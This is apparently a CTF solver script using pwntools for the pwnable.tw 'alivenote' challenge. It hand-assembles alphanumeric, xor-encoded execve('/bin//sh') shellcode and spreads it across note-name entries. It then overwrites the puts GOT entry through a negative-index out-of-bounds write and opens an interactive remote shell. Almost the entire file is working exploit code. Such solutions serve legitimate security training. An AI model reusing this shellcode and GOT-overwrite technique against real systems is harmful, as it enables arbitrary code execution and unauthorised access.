from pwn import *

class AliveNoteSolver(object):
    # 42 instructions
    shellcode1 = [
        # Address of shellcode is in edx
        # push '/bin///sh\\x00'
        "push 0x68",
        "push 0x326e6e6e", # "s///" xor "AAAA"
        "pop eax",
        "xor eax, 0x41414141",
        "push eax",
        "push 0x6e69626e", # "nib/" xor "---A"
        "pop eax",
        "xor al, 0x41",
        "push eax",

        # call execve('esp', 0, 0)
        # ebx = esp
        "push 0x41415A70",
        "pop eax",
        "xor eax, 0x41415020", # eax = 0x0A50
        "push esp",
        "pop ecx",   # ecx = esp
        "push 0x41", # eax
        "push ecx",  # ecx
        "push edx",  # edx
        "push ecx",  # ebx = esp
        "push esp",  # skipped esp
        "push ebp",  # ebp
        "push eax",  # esi = 0x0A50
        "push edi",  # edi
        "popad",

        # Get a 0xFF
        "xor al, 0x41", # ax = 0
        "dec eax",

        # xor decode the epo of shellcode
        "xor [edx + esi + 0x30], al",
        "dec eax",
        "dec eax",
        "dec eax",
        "dec eax",
        "dec eax",
        "xor [edx + esi + 0x31], al",

        # ecx = 0
        "push 0x41",
        "pop eax",
        "xor al, 0x41",
        "push eax",
        "pop ecx",

        # edx = 0
        "push eax",
        "pop edx",

        # eax = SYS_execve
        "push 0x41",
        "pop eax",
        "xor al, 0x4a",
    ]

    shellcode_encoder = 0xFFFA
    shellcode2 = """
        int 0x80
    """

    def __init__(self, prog, ps):
        self.prog = ELF(prog)
        self.ps   = ps

        self.note_addr = self.prog.symbols['note']

    def add_name(self, index, name):
        if len(name) > 80:
            raise ValueError('Name is too long!')
        if not all(s == ' ' or s.isalnum() for s in name.split('\0')[0]):
            raise ValueError('This name will be blocked!')

        # Select 'add name' on the menu
        self.ps.sendlineafter('Your choice :', '1')
        # Enter index
        self.ps.sendlineafter('Index :', str(index))
        # Send the name
        self.ps.recvuntil('Name :')
        self.ps.sendline(name)

    def del_name(self, index):
        # Select 'del name' on the menu
        self.ps.sendlineafter('Your choice :', '3')
        # Enter index
        self.ps.sendlineafter('Index :', str(index))

    def addr2index(self, addr):
        if addr % 4 != 0:
            raise ValueError('Address must be a multiple of 4!')

        if addr < self.note_addr:
            return -(self.note_addr - addr) / 4
        else:
            # Make integer subtraction overflow
            return -(addr + 1 + 0xffffffff - self.note_addr) / 4

    def get_shellcode(self):
        shellcode1         = map(asm, self.shellcode1)
        shellcode2_encoded = xor(asm(self.shellcode2), p16(self.shellcode_encoder, endian='big'))

        padding = asm('inc edi')
        jne     = '\x75\x38'     # jne eip+0x38

        result = map(lambda code: code + padding * (6 - len(code)) + jne, shellcode1)
        result.append(shellcode2_encoded)
        return result

    def spawn_shell(self):
        shellcode = self.get_shellcode()

        self.add_name(1, shellcode[0])
        for inst in shellcode[1:]:
            self.add_name(0, "padding")
            self.add_name(0, "padding")
            self.add_name(0, "padding")
            self.add_name(0, inst)

        self.del_name(1)
        self.add_name(
            self.addr2index(self.prog.got['puts']),
            shellcode[0]
        )
        self.ps.interactive()


if __name__ == '__main__':
    solver = AliveNoteSolver('./alivenote/alivenote', remote('ctf.pwnable.tw', 55688))
    solver.spawn_shell()

